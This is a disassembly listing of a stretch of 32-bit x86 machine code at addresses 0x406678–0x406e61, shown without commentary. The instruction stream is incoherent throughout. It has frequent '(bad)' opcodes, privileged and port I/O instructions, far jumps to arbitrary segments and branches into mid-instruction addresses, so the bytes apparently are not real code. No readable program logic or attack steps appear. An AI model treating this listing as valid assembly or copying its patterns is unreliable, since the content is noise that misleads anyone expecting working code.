  406678:	mov    ecx,0xbc3f8aff
  40667d:	add    al,cl
  40667f:	popf   
  406680:	pop    ebx
  406681:	ja     0x406630
  406683:	shl    ah,0x3f
  406686:	je     0x40669e
  406688:	fbld   TBYTE PTR [esi-0x67]
  40668b:	enter  0x56b6,0xb9
  40668f:	jno    0x406691
  406691:	jne    0x4066a3
  406693:	inc    esp
  406694:	mov    ecx,0x4c651f59
  406699:	add    BYTE PTR [ebx+0x5cf6fc42],ah
  40669f:	add    BYTE PTR [ebp+0x5f03714b],0x34
  4066a6:	addr16 xchg edi,eax
  4066a8:	sti    
  4066a9:	retf   0x1121
  4066ac:	and    DWORD PTR [eax+0x4dbbf2d1],ebx
  4066b2:	aad    0x62
  4066b4:	mov    al,0x4e
  4066b6:	dec    ebx
  4066b7:	inc    ecx
  4066b8:	gs cmp al,0x5c
  4066bb:	out    0x7f,al
  4066bd:	aaa    
  4066be:	lods   al,BYTE PTR ds:[esi]
  4066bf:	adc    bh,bl
  4066c1:	xor    al,0xc6
  4066c3:	mov    bh,BYTE PTR [esi]
  4066c5:	mov    eax,ds:0xf0235e4e
  4066ca:	int3   
  4066cb:	scas   al,BYTE PTR es:[edi]
  4066cc:	ds xor eax,0x9f4d13e0
  4066d2:	int3   
  4066d3:	sbb    BYTE PTR [eax],dl
  4066d5:	sub    DWORD PTR [eax-0x40c1218c],ebp
  4066db:	mov    ch,0xe4
  4066dd:	adc    al,0x20
  4066df:	fwait
  4066e0:	int    0x34
  4066e2:	jne    0x4066c0
  4066e4:	cwde   
  4066e5:	adc    ch,BYTE PTR [edi]
  4066e7:	pop    es
  4066e8:	xchg   ecx,eax
  4066e9:	dec    ebx
  4066ea:	(bad)  
  4066eb:	fisub  DWORD PTR [edi-0x3e]
  4066ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066ef:	fcomp  QWORD PTR [ecx-0x25]
  4066f2:	jecxz  0x406757
  4066f4:	dec    edx
  4066f5:	fcmovne st,st(7)
  4066f7:	xchg   edi,eax
  4066f8:	mov    BYTE PTR [eax-0x71427e23],dh
  4066fe:	jge    0x406754
  406700:	fwait
  406701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406702:	and    esp,DWORD PTR [edx-0x46]
  406705:	in     eax,dx
  406706:	xor    eax,DWORD PTR [esi+0x45]
  406709:	push   ds
  40670a:	neg    DWORD PTR [esi+0x1bba0e7e]
  406710:	rcl    DWORD PTR [ebp-0x17],0xcf
  406714:	add    bh,BYTE PTR ds:0x7041fdd6
  40671a:	loope  0x4066ef
  40671c:	nop
  40671d:	xchg   edi,eax
  40671e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40671f:	pushf  
  406720:	mov    ecx,0xaa08e2a6
  406725:	aad    0x54
  406727:	int3   
  406728:	add    al,0x5f
  40672a:	bound  ecx,QWORD PTR [edi+ebx*8+0x1]
  40672e:	sahf   
  40672f:	lahf   
  406730:	and    DWORD PTR [esi+0x66],edi
  406733:	jp     0x406768
  406735:	xchg   ecx,eax
  406736:	scas   al,BYTE PTR es:[edi]
  406737:	xchg   esi,eax
  406738:	or     ah,BYTE PTR [edx-0x79]
  40673b:	inc    ecx
  40673c:	xlat   BYTE PTR ds:[ebx]
  40673d:	xchg   esi,eax
  40673e:	dec    ecx
  40673f:	stos   BYTE PTR es:[edi],al
  406740:	pop    ecx
  406741:	mov    DWORD PTR [ebx],ebx
  406743:	inc    esp
  406744:	mov    esi,0xf6146c69
  406749:	data16 aaa 
  40674b:	xchg   esp,eax
  40674c:	and    bh,BYTE PTR [esi-0x3a]
  40674f:	loope  0x4066e8
  406751:	test   BYTE PTR [edi-0x7fb334fd],al
  406757:	jecxz  0x406795
  406759:	and    BYTE PTR [edi-0x13504b15],0x14
  406760:	adc    ebp,edx
  406762:	out    dx,eax
  406763:	mov    ds:0xaefc669d,eax
  406768:	mov    al,ds:0xa6ed63e3
  40676d:	retf   
  40676e:	addr16 sahf 
  406770:	sbb    al,0x46
  406772:	sub    ecx,DWORD PTR [eax-0x16c63daf]
  406778:	mov    bh,0x68
  40677a:	std    
  40677b:	adc    BYTE PTR [esi],0x25
  40677e:	cld    
  40677f:	cmp    al,0x44
  406781:	jo     0x4067f0
  406783:	and    al,0x6a
  406785:	jae    0x406766
  406787:	retf   
  406788:	sub    eax,0xd1f13d69
  40678d:	int    0x3f
  40678f:	out    dx,eax
  406790:	sub    DWORD PTR [esi-0x2d],ecx
  406793:	into   
  406794:	sbb    dl,al
  406796:	mov    edx,DWORD PTR [ebp-0x6f]
  406799:	jb     0x40671f
  40679b:	dec    esp
  40679c:	fucomp st(1)
  40679e:	loop   0x4067e4
  4067a0:	mov    cl,0xe9
  4067a2:	gs dec esp
  4067a4:	mov    eax,ds:0xf3aca06e
  4067a9:	mov    esp,0x62858659
  4067ae:	or     cl,cl
  4067b0:	icebp  
  4067b1:	shl    BYTE PTR [ecx-0x3b],0x49
  4067b5:	icebp  
  4067b6:	(bad)  [ebx-0x24]
  4067b9:	sub    BYTE PTR ds:0x9ca94006,0x69
  4067c0:	mov    al,0x59
  4067c3:	and    al,0x96
  4067c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067c6:	or     BYTE PTR [ecx],bh
  4067c8:	dec    esi
  4067c9:	adc    DWORD PTR [ecx-0x61],esi
  4067cc:	sar    DWORD PTR [ebx-0x4],1
  4067cf:	sub    cl,BYTE PTR [esi+0x6b]
  4067d2:	push   cs
  4067d3:	mov    ds:0x7a709096,al
  4067d8:	test   eax,0x94150498
  4067dd:	jno    0x40682e
  4067df:	cmc    
  4067e0:	xchg   ecx,eax
  4067e1:	aad    0xd4
  4067e3:	mov    eax,0xd9ff2d62
  4067e8:	test   BYTE PTR [ebp+edx*4-0xa],0xe
  4067ed:	xchg   ebp,eax
  4067ee:	cmp    al,BYTE PTR [eax-0x75046166]
  4067f4:	mov    ebp,0x35ba1360
  4067f9:	mov    dl,0x69
  4067fb:	sub    eax,0x4fe9d9c1
  406800:	(bad)  
  406802:	cdq    
  406803:	cmp    eax,0x24caa176
  406808:	mov    cs:0x28a487ca,eax
  40680e:	shr    DWORD PTR [edi],0x4d
  406811:	mov    ah,0xb0
  406813:	(bad)
  406816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406817:	popf   
  406818:	in     al,dx
  406819:	in     eax,dx
  40681a:	push   cs
  40681b:	xor    al,0xd8
  40681d:	cld    
  40681e:	ss ins WORD PTR es:[edi],dx
  406821:	xor    al,0x93
  406823:	fdivr  DWORD PTR [edx+0x37]
  406826:	inc    esi
  406827:	add    edi,eax
  406829:	jmp    0x38b:0x797b4a77
  406830:	mov    bh,0x7c
  406832:	js     0x4067fd
  406834:	xchg   ebx,eax
  406835:	std    
  406836:	mov    eax,ds:0xdcf14cec
  40683b:	cwde   
  40683c:	jae    0x4068af
  40683e:	shl    ebp,0xa
  406841:	repnz jmp 0xb276:0x471dd87b
  406849:	in     al,0xaa
  40684b:	das    
  40684c:	adc    BYTE PTR ds:0x721893ed,dh
  406852:	shl    BYTE PTR [edi+0x37],cl
  406855:	xchg   esi,eax
  406856:	push   cs
  406857:	sbb    edx,DWORD PTR [esi+0x18]
  40685a:	or     cl,BYTE PTR [esi+eax*2+0x34]
  40685e:	enter  0xd474,0x57
  406862:	lds    esi,FWORD PTR [ebp+ebp*1+0x54]
  406866:	adc    BYTE PTR [eax+0x36],bl
  406869:	stos   DWORD PTR es:[edi],eax
  40686a:	shl    DWORD PTR [ebx+ebp*1-0x3c8eca2e],cl
  406871:	popf   
  406872:	inc    ebp
  406873:	mov    ?,WORD PTR [edx+0x57736b57]
  406879:	xchg   ebp,ecx
  40687b:	out    dx,al
  40687c:	cmp    esp,esi
  40687e:	jbe    0x40681a
  406880:	cmp    BYTE PTR [ebx+edi*2],ch
  406883:	xor    al,0xda
  406885:	retf   0x477a
  406888:	rcr    bl,cl
  40688a:	mov    BYTE PTR [edx+edi*1-0x23c2929],bl
  406891:	sbb    al,0x7f
  406893:	xchg   ebx,eax
  406894:	cdq    
  406895:	jns    0x406861
  406897:	or     cl,ch
  406899:	xor    eax,0x8a427686
  40689e:	cmp    ebx,esp
  4068a0:	ins    DWORD PTR es:[edi],dx
  4068a1:	je     0x406909
  4068a3:	mov    eax,0xe4e81296
  4068a8:	push   ss
  4068a9:	cmp    al,0x76
  4068ab:	loop   0x4068f1
  4068ad:	inc    eax
  4068ae:	cmp    esi,DWORD PTR [esi-0x22b5287f]
  4068b4:	cli    
  4068b5:	(bad)  
  4068b6:	sti    
  4068b7:	test   DWORD PTR [eax-0x70],esp
  4068ba:	faddp  st(6),st
  4068bc:	fimul  WORD PTR [edi+0x6b]
  4068bf:	sbb    al,0x17
  4068c1:	add    esi,edx
  4068c3:	adc    esi,DWORD PTR [esi-0x7f94a47f]
  4068c9:	pushf  
  4068ca:	mov    edx,0x15d8eb03
  4068cf:	pop    ebp
  4068d0:	xchg   ecx,eax
  4068d1:	jp     0x406870
  4068d3:	dec    ebx
  4068d4:	aad    0xa1
  4068d6:	sub    ebp,ebx
  4068d8:	lahf   
  4068d9:	cdq    
  4068da:	in     eax,dx
  4068db:	dec    esp
  4068dc:	repnz ins BYTE PTR es:[edi],dx
  4068de:	cmp    ebx,DWORD PTR [ebx+0x7]
  4068e1:	sahf   
  4068e2:	sub    cl,BYTE PTR [ebx+0x4df2b280]
  4068e8:	mov    ch,0x6f
  4068ea:	push   edi
  4068eb:	pop    eax
  4068ec:	add    al,0xab
  4068ee:	ss adc al,0x9a
  4068f1:	push   ecx
  4068f2:	mov    ebx,0xb194200c
  4068f7:	mov    dh,0x2a
  4068f9:	test   DWORD PTR [eax+0x768021a9],edi
  4068ff:	xlat   BYTE PTR ds:[ebx]
  406900:	push   0xfc26dd4b
  406905:	jno    0x406906
  406907:	dec    ecx
  406908:	mov    eax,ds:0xe0f1e440
  40690d:	hlt    
  40690e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40690f:	mov    ebx,DWORD PTR [ebx+0x2b5f2910]
  406915:	push   ebx
  406916:	sbb    DWORD PTR [eax],edx
  406918:	xor    eax,0xa6efe02f
  40691d:	cmp    al,0x16
  40691f:	pop    ds
  406920:	arpl   WORD PTR [edi+0x3],di
  406923:	sbb    al,0xf8
  406925:	xor    cx,0x2e
  406929:	add    ebp,DWORD PTR [esi]
  40692b:	adc    eax,ebx
  40692d:	xor    al,0x8a
  40692f:	es clc 
  406931:	imul   esp,DWORD PTR [edi],0xfffffffb
  406934:	fdiv   QWORD PTR [eax-0x6faedcc6]
  40693a:	mov    ?,WORD PTR [eax-0x4b]
  40693d:	es (bad) 
  406940:	xchg   DWORD PTR [ebx],esi
  406942:	loop   0x4068ea
  406944:	mov    eax,ds:0x243c855f
  406949:	pop    DWORD PTR [ecx-0x7851ac07]
  40694f:	jp     0x406950
  406951:	xchg   ebp,eax
  406952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406953:	repz push edi
  406955:	gs int 0xbf
  406958:	imul   DWORD PTR [ecx-0x13]
  40695b:	pop    ebp
  40695c:	mov    bh,0x73
  40695e:	nop
  40695f:	fwait
  406960:	pop    ds
  406961:	shl    DWORD PTR [edx-0xc],cl
  406964:	rol    DWORD PTR [ecx+0x79],1
  406967:	pop    es
  406968:	in     eax,dx
  406969:	push   eax
  40696a:	out    0xc1,al
  40696c:	repnz or bh,cl
  40696f:	(bad)  
  406970:	jbe    0x40696d
  406972:	gs sbb ebx,ecx
  406975:	(bad)  
  406976:	sub    ecx,ebp
  406978:	lods   al,BYTE PTR ds:[esi]
  406979:	push   esp
  40697a:	gs mov esi,0xc645433b
  406980:	inc    esi
  406981:	xchg   edx,edi
  406983:	les    esp,FWORD PTR [ebx-0x354461a1]
  406989:	or     ecx,edi
  40698b:	rcr    DWORD PTR [ebp+0x0],0x6c
  40698f:	xlat   BYTE PTR ds:[ebx]
  406990:	or     ch,al
  406992:	loope  0x406929
  406994:	dec    ebx
  406995:	xchg   cl,bh
  406997:	fsubrp st(1),st
  406999:	jb     0x406a13
  40699b:	int    0x78
  40699d:	sub    esp,esp
  40699f:	add    al,0x3e
  4069a1:	ret    0x329f
  4069a4:	retf   0xbbc9
  4069a7:	push   eax
  4069a8:	inc    ebx
  4069a9:	hlt    
  4069aa:	inc    ecx
  4069ab:	cs retf 0x3964
  4069af:	test   esp,edi
  4069b1:	and    DWORD PTR [esi],esp
  4069b3:	rcl    BYTE PTR [ecx+0x76],0xf8
  4069b7:	inc    eax
  4069b8:	fcmovu st,st(7)
  4069ba:	icebp  
  4069bb:	add    ebp,esp
  4069bd:	dec    edx
  4069be:	popf   
  4069bf:	lods   al,BYTE PTR ds:[esi]
  4069c0:	call   0x520c:0xec98a760
  4069c7:	out    0x2,eax
  4069c9:	inc    ecx
  4069ca:	add    ebp,DWORD PTR [eax-0x772e8c45]
  4069d0:	mov    esp,fs
  4069d2:	fist   DWORD PTR [ebx+ebx*2-0x76]
  4069d6:	push   ebx
  4069d7:	sub    BYTE PTR [ecx],cl
  4069d9:	or     edx,DWORD PTR [esi+edx*1-0x67]
  4069dd:	dec    ebx
  4069de:	add    al,0x82
  4069e0:	and    DWORD PTR [edi],edi
  4069e2:	imul   ecx,DWORD PTR [ecx+0x2f],0xffffffbd
  4069e6:	sti    
  4069e7:	pop    ebp
  4069e8:	mov    ch,0x6d
  4069ea:	and    BYTE PTR [ebx],dh
  4069ec:	add    BYTE PTR [eax],ah
  4069ee:	sub    al,0x29
  4069f0:	jne    0x4069e6
  4069f2:	and    BYTE PTR [esi-0x41b14084],0xa
  4069f9:	jecxz  0x4069dc
  4069fb:	bound  ecx,QWORD PTR ds:0xf804a2a6
  406a01:	push   es
  406a02:	add    eax,0x81f50f27
  406a07:	and    eax,0xb40a732d
  406a0c:	mov    edx,0x7a706151
  406a11:	stc    
  406a12:	test   cl,bh
  406a14:	push   ss
  406a15:	out    0x2e,al
  406a17:	mov    cl,0x78
  406a19:	mov    esp,0xb41693f0
  406a1e:	popf   
  406a1f:	test   BYTE PTR [edx+0x77],0x9f
  406a23:	je     0x406a4c
  406a25:	idiv   DWORD PTR [eiz*4-0x3b85239a]
  406a2c:	pop    ss
  406a2d:	lea    edi,[edi+0x15]
  406a30:	pop    ecx
  406a31:	out    0x62,eax
  406a33:	sbb    eax,ecx
  406a35:	int3   
  406a36:	cmp    eax,0x5037602c
  406a3b:	hlt    
  406a3c:	add    DWORD PTR [eax],edx
  406a3e:	xchg   DWORD PTR [eax+0x2ded2bbc],ebx
  406a44:	adc    DWORD PTR [ecx+0x500da39d],ecx
  406a4a:	cmp    ecx,esi
  406a4c:	add    edx,DWORD PTR [esp+eiz*2]
  406a4f:	(bad)  
  406a50:	rcl    BYTE PTR [eax+0x39],cl
  406a53:	push   ebx
  406a54:	mov    esp,0xffbd39ca
  406a59:	in     al,dx
  406a5a:	es test al,0x32
  406a5d:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  406a5f:	aad    0x4d
  406a61:	mov    bl,0xd
  406a63:	xchg   ecx,eax
  406a64:	lea    edx,[edx+esi*2-0x7e]
  406a68:	sbb    DWORD PTR [eax-0x1eda44dc],edi
  406a6e:	ror    DWORD PTR [esi+edi*4-0x6680db0e],0x53
  406a76:	scas   eax,DWORD PTR es:[edi]
  406a77:	jo     0x406abc
  406a79:	jo     0x406ac6
  406a7b:	xchg   esi,edi
  406a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a7e:	test   esp,0xe316c991
  406a84:	add    DWORD PTR [ecx],ebp
  406a86:	cld    
  406a87:	(bad)  [edi+0xa]
  406a8a:	cs push ds
  406a8c:	and    esp,eax
  406a8e:	adc    DWORD PTR [edi-0x7d],esp
  406a91:	scas   al,BYTE PTR es:[edi]
  406a92:	repnz arpl WORD PTR [edi+0x71],di
  406a96:	ins    DWORD PTR es:[edi],dx
  406a97:	mov    dh,0x34
  406a99:	jl     0x406a94
  406a9b:	shl    BYTE PTR [ebx+0x2c11a462],cl
  406aa1:	cld    
  406aa2:	xor    esi,DWORD PTR [eax+0x7a232bf0]
  406aa8:	mov    ecx,0xfadc041a
  406aad:	in     al,0x35
  406aaf:	xchg   edi,eax
  406ab0:	or     ebx,DWORD PTR es:[ebx-0x22]
  406ab4:	idiv   al
  406ab6:	stos   DWORD PTR es:[edi],eax
  406ab7:	sub    al,0x49
  406ab9:	aam    0x92
  406abb:	dec    esp
  406abc:	stos   DWORD PTR es:[edi],eax
  406abd:	sub    BYTE PTR [esi-0x11],dl
  406ac0:	mov    eax,ds:0xdacf2fa5
  406ac5:	(bad)  
  406ac6:	cli    
  406ac7:	fcomip st,st(1)
  406ac9:	and    bh,0xac
  406acc:	jno    0x406a99
  406ace:	xor    eax,DWORD PTR [esi+0x4]
  406ad1:	add    eax,0x282f9612
  406ad6:	cdq    
  406ad7:	push   ecx
  406ad8:	or     eax,0xb936de9b
  406add:	addr16 out dx,eax
  406adf:	inc    esp
  406ae0:	fucomip st,st(0)
  406ae2:	aad    0x68
  406ae4:	xchg   esi,eax
  406ae5:	cmp    BYTE PTR [ecx+0x36d8a750],bl
  406aeb:	stos   BYTE PTR es:[edi],al
  406aec:	jb     0x406ae9
  406aee:	imul   ebp,DWORD PTR [edx-0x3404a1a3],0x447adcd2
  406af8:	or     al,0x95
  406afa:	push   esi
  406afb:	clc    
  406afc:	cmc    
  406afd:	test   DWORD PTR [edx-0x8],eax
  406b00:	sbb    dh,BYTE PTR [eax+edx*8+0x59ffa74]
  406b07:	ja     0x406ae8
  406b09:	pop    ebp
  406b0a:	jbe    0x406b10
  406b0c:	sbb    dl,BYTE PTR [eax+ecx*8]
  406b0f:	rol    BYTE PTR [edi+0x21],1
  406b12:	xor    eax,0x613c36c7
  406b17:	jmp    0x33fd99a0
  406b1c:	adc    eax,0xe41fc550
  406b21:	jecxz  0x406b94
  406b23:	mov    eax,0x405774d7
  406b28:	cmp    eax,0x86092d14
  406b2d:	or     al,0xbf
  406b2f:	push   eax
  406b30:	mov    al,ds:0x4ca1d0a5
  406b35:	cld    
  406b36:	retf   0xdd70
  406b39:	adc    edx,ebx
  406b3b:	mov    ds:0xbd3713c8,eax
  406b40:	mov    ch,BYTE PTR [eax]
  406b42:	(bad)
  406b45:	xor    eax,0xf2060015
  406b4a:	pop    esp
  406b4b:	cmp    BYTE PTR [edx+0x6c],al
  406b4e:	jmp    0xc2e2:0x5fc488b2
  406b55:	cmp    bh,ch
  406b57:	fisub  DWORD PTR [ecx]
  406b59:	imul   ebx,DWORD PTR [esi+0x7e],0x5d0fe6ab
  406b60:	pop    ebx
  406b61:	cmp    BYTE PTR [ebx],0x1
  406b64:	push   cs
  406b65:	aaa    
  406b66:	lock xchg BYTE PTR [ecx],cl
  406b69:	int3   
  406b6a:	xor    al,0xab
  406b6c:	inc    esp
  406b6d:	call   0x7061:0x935bd1b0
  406b74:	mov    edx,0xc2feba14
  406b79:	lock jmp 0x406b60
  406b7c:	sbb    eax,0xd2259735
  406b81:	and    eax,0xe5335049
  406b86:	je     0x406bf6
  406b88:	push   esp
  406b89:	jo     0x406c0a
  406b8b:	ja     0x406b8a
  406b8d:	push   cs
  406b8e:	adc    DWORD PTR ds:0x1614bd77,edx
  406b94:	pop    edi
  406b95:	cmp    al,0x88
  406b97:	cli    
  406b98:	inc    ebp
  406b99:	xchg   DWORD PTR [edx+0x172edca],ebp
  406b9f:	ret    0x3541
  406ba2:	or     DWORD PTR [esi+0x5eee0d4f],esp
  406ba8:	push   0x1cfee813
  406bad:	sub    al,0x24
  406baf:	cs cdq 
  406bb1:	mov    al,0x6e
  406bb3:	(bad)  
  406bb4:	dec    ebp
  406bb5:	pushf  
  406bb6:	not    DWORD PTR [edx+0x484bf38e]
  406bbc:	jmp    0x6dfb3c26
  406bc1:	xchg   edx,eax
  406bc2:	js     0x406c17
  406bc4:	push   cs
  406bc5:	dec    eax
  406bc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bc7:	jp     0x406b4a
  406bc9:	sub    eax,0x6041a774
  406bce:	mov    esi,0x971d20ed
  406bd3:	daa    
  406bd4:	cdq    
  406bd5:	mov    esi,0xe9facc1b
  406bda:	jle    0x406c4e
  406bdc:	fdiv   QWORD PTR [eax+0x58e69d06]
  406be2:	data16 std 
  406be4:	sti    
  406be5:	neg    DWORD PTR [esi]
  406be7:	jb     0x406be5
  406be9:	xchg   edi,eax
  406bea:	adc    BYTE PTR [ecx-0x6a789eab],ch
  406bf0:	mov    ch,0xea
  406bf2:	sti    
  406bf3:	test   al,0xce
  406bf5:	dec    ebp
  406bf6:	add    dl,bl
  406bf8:	dec    ebx
  406bf9:	jbe    0x406bf6
  406bfb:	mov    ch,0x44
  406bfd:	in     al,0x10
  406bff:	inc    edi
  406c00:	cmc    
  406c01:	sbb    DWORD PTR [esp+ebx*2+0x73],edx
  406c05:	mov    esp,0xd69d6805
  406c0a:	cs call 0x9ffceeb4
  406c10:	dec    edx
  406c11:	cs ror esp,0xbd
  406c15:	ins    DWORD PTR es:[edi],dx
  406c16:	push   ebx
  406c17:	mov    ch,0x51
  406c19:	or     dh,BYTE PTR [edx+0x5a]
  406c1c:	push   ecx
  406c1d:	cwde   
  406c1e:	fsub   st,st(7)
  406c20:	inc    edi
  406c21:	cld    
  406c22:	in     eax,0xf3
  406c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c25:	jl     0x406bd8
  406c27:	adc    ebx,DWORD PTR [eax+0x2af81e38]
  406c2d:	pop    ss
  406c2e:	dec    edx
  406c2f:	sbb    edi,esp
  406c31:	push   esp
  406c32:	sub    esp,DWORD PTR [ebx+0x6d]
  406c35:	pop    edx
  406c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c37:	lock mov DWORD PTR [esi+0x42f4246c],esi
  406c3e:	es pop ebx
  406c40:	scas   eax,DWORD PTR es:[edi]
  406c41:	loop   0x406c1b
  406c43:	mov    al,ds:0x2cc670a9
  406c48:	pop    ecx
  406c49:	inc    ebp
  406c4a:	(bad)  
  406c4b:	arpl   WORD PTR [esi+ecx*2-0x4ba1fe35],bx
  406c52:	mov    ch,0x89
  406c54:	xchg   ecx,eax
  406c55:	mov    eax,0x6b0e640c
  406c5a:	pop    ebp
  406c5b:	jecxz  0x406c17
  406c5d:	mov    edx,0x9eee3dd4
  406c62:	jnp    0x406c52
  406c64:	call   0x5104:0xf71a9c42
  406c6b:	cmp    BYTE PTR [ecx-0x608624de],0x7
  406c72:	out    dx,eax
  406c73:	call   0x9a38:0xa29cdb2
  406c7a:	js     0x406ce8
  406c7c:	xchg   ecx,eax
  406c7d:	adc    dl,BYTE PTR [esi+0x5c]
  406c80:	mov    dl,ah
  406c82:	pop    ds
  406c83:	mov    edi,0x6ad34115
  406c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c89:	pop    edi
  406c8a:	or     DWORD PTR [edi],ebx
  406c8c:	dec    esi
  406c8d:	pop    ebp
  406c8e:	cmp    eax,0x71540a9
  406c93:	sub    DWORD PTR [esi+0x4e],esi
  406c96:	xchg   edi,eax
  406c97:	adc    bh,BYTE PTR [eax*2+0x6ce33239]
  406c9e:	mov    ecx,0xeebd30e1
  406ca3:	dec    edx
  406ca4:	les    edx,FWORD PTR [esi+0x3f575f0e]
  406caa:	mov    dh,BYTE PTR [ebp-0x5d]
  406cad:	xor    dh,BYTE PTR [ebx-0x71]
  406cb0:	(bad)  
  406cb1:	cli    
  406cb2:	cld    
  406cb3:	mov    eax,ds:0x16acba53
  406cb8:	nop
  406cb9:	adc    eax,0x5e7e2044
  406cbe:	cmp    ch,BYTE PTR [ebp-0xf860c1d]
  406cc4:	mov    WORD PTR [edx],fs
  406cc6:	iret   
  406cc7:	iret   
  406cc8:	cs cli 
  406cca:	pushf  
  406ccb:	jnp    0x406cf3
  406ccd:	gs retf 0xc08
  406cd1:	call   FWORD PTR [esp+edx*1+0x7]
  406cd5:	dec    edi
  406cd6:	loope  0x406d3c
  406cd8:	js     0x406caa
  406cda:	sub    bh,0xa1
  406cdd:	inc    eax
  406cde:	mov    ah,0x9e
  406ce0:	push   ebx
  406ce1:	jnp    0x406cc9
  406ce3:	adc    DWORD PTR [edx],ebp
  406ce5:	(bad)  
  406ce7:	dec    ebp
  406ce8:	xchg   edi,eax
  406ce9:	cld    
  406cea:	mov    eax,ds:0xee0755b3
  406cef:	cwde   
  406cf0:	mov    edx,0x22013fe
  406cf5:	call   0xd450:0xa5bf218f
  406cfc:	(bad)  
  406cfd:	pusha  
  406cfe:	ret    
  406cff:	mov    ebp,0x7822422a
  406d04:	jae    0x406d40
  406d06:	or     DWORD PTR [ebx+ebx*2],0xf820d9e7
  406d0d:	fiadd  WORD PTR [eax+ecx*8]
  406d10:	push   eax
  406d11:	cmp    al,BYTE PTR [esi-0x26af1aa9]
  406d17:	and    BYTE PTR [edx],0x41
  406d1a:	pushf  
  406d1b:	ds xor al,0xb5
  406d1e:	leave  
  406d1f:	(bad)  
  406d20:	jmp    0xac66d456
  406d25:	retf   
  406d26:	cmp    ecx,DWORD PTR [ebx+0x79]
  406d29:	rcl    edx,0x71
  406d2c:	jbe    0x406d6f
  406d2e:	outs   dx,BYTE PTR ds:[esi]
  406d2f:	retf   0x9a52
  406d32:	add    eax,0xbc0e19b7
  406d37:	xor    DWORD PTR [eax-0x3bb7243b],0x13
  406d3e:	clc    
  406d3f:	inc    eax
  406d40:	mov    al,0x26
  406d42:	push   cs
  406d43:	rcl    esp,0x7e
  406d46:	ss push esp
  406d48:	loope  0x406db8
  406d4a:	cmp    eax,0xc2855e9d
  406d4f:	xchg   bh,cl
  406d51:	sub    eax,edi
  406d53:	add    al,0xd1
  406d55:	(bad)  
  406d56:	in     al,dx
  406d57:	push   ebx
  406d58:	out    dx,eax
  406d59:	mov    ah,0xe4
  406d5b:	or     edi,DWORD PTR [eax+0x44]
  406d5e:	mov    eax,0x5a787f92
  406d63:	xor    BYTE PTR [edi],bh
  406d65:	or     BYTE PTR [edi-0x72],0xca
  406d69:	iret   
  406d6a:	fcom   DWORD PTR [ebx+0x39]
  406d6d:	lds    ebx,FWORD PTR [ecx+0x9f7ed77]
  406d73:	rol    BYTE PTR [ecx],cl
  406d75:	daa    
  406d76:	pop    ecx
  406d77:	mov    dl,al
  406d79:	xlat   BYTE PTR ds:[ebx]
  406d7a:	jne    0x406dc1
  406d7c:	imul   esp,DWORD PTR [eax-0x3db5f80],0xffffffac
  406d83:	xchg   esi,eax
  406d84:	xchg   ch,ah
  406d86:	test   DWORD PTR [eax+0x6385688c],edi
  406d8c:	jecxz  0x406d5e
  406d8e:	add    eax,0x7ea68d6b
  406d93:	jle    0x406d93
  406d95:	mov    al,ds:0xcca29c3e
  406d9a:	data16 into 
  406d9c:	bound  ebx,QWORD PTR [ebp+eiz*2+0x2d5bdc4]
  406da3:	jb     0x406dde
  406da5:	adc    eax,0xdf1365d4
  406daa:	pusha  
  406dab:	jecxz  0x406db5
  406dad:	out    0x73,al
  406daf:	jnp    0x406dba
  406db1:	cmp    dh,BYTE PTR [ecx-0x4d396e48]
  406db7:	(bad)  
  406db9:	repz mov esp,0xd64003d8
  406dbf:	xor    esi,DWORD PTR [ecx]
  406dc1:	les    esi,FWORD PTR [ebp+0x8]
  406dc4:	mov    esp,cs
  406dc6:	arpl   WORD PTR [eax+0x52b15d72],ax
  406dcc:	sub    eax,0x32ab56f8
  406dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dd2:	fwait
  406dd3:	xchg   ecx,eax
  406dd4:	cmp    eax,0xa5eb6d04
  406dd9:	(bad)  
  406dda:	sbb    DWORD PTR [edi+0x3b6ee3df],esp
  406de0:	scas   eax,DWORD PTR es:[edi]
  406de1:	jmp    0xb167c9ec
  406de6:	xor    BYTE PTR [esi],bl
  406de8:	mov    dl,0xd4
  406dea:	jbe    0x406e48
  406dec:	jmp    0x56fbb9a7
  406df1:	cdq    
  406df2:	fldcw  WORD PTR [ecx-0x253adbd8]
  406df8:	popf   
  406df9:	and    esi,edi
  406dfb:	sub    dl,BYTE PTR [ecx]
  406dfd:	xchg   ebx,eax
  406dfe:	inc    esi
  406dff:	mov    ds:0x5638dd3e,al
  406e04:	stos   BYTE PTR es:[edi],al
  406e05:	fsubr  QWORD PTR [ebp-0x5b4c29a]
  406e0b:	(bad)  
  406e0c:	mov    ecx,0xa24073de
  406e11:	mov    ebp,0x4612a9b7
  406e16:	and    BYTE PTR [esi-0x50],cl
  406e19:	dec    esp
  406e1a:	push   ecx
  406e1b:	and    BYTE PTR [esi-0x49b93fe0],0x79
  406e22:	dec    ebx
  406e23:	(bad)  
  406e24:	cld    
  406e25:	mov    bl,0x1a
  406e27:	push   ecx
  406e28:	and    ecx,DWORD PTR [esi]
  406e2a:	pop    esp
  406e2b:	shl    eax,cl
  406e2d:	inc    edx
  406e2e:	adc    al,0xd1
  406e30:	mov    fs,WORD PTR [ebp+0x7b]
  406e33:	jge    0x406e49
  406e35:	mov    cl,0xa0
  406e37:	jmp    0x1b0e:0x12138131
  406e3e:	stos   DWORD PTR es:[edi],eax
  406e3f:	test   DWORD PTR [edi-0x166f640],0x87cdbd5d
  406e49:	sub    al,0x59
  406e4b:	ins    BYTE PTR es:[edi],dx
  406e4c:	pop    ebp
  406e4d:	xor    BYTE PTR [edi+0x3e],dh
  406e50:	in     al,dx
  406e51:	sub    al,0x77
  406e53:	xor    eax,0x4c7f3f17
  406e58:	push   ecx
  406e59:	ficom  WORD PTR [eax-0x4681abdb]
  406e5f:	sar    DWORD PTR [esi],cl
  406e61:	adc    al,0x7a
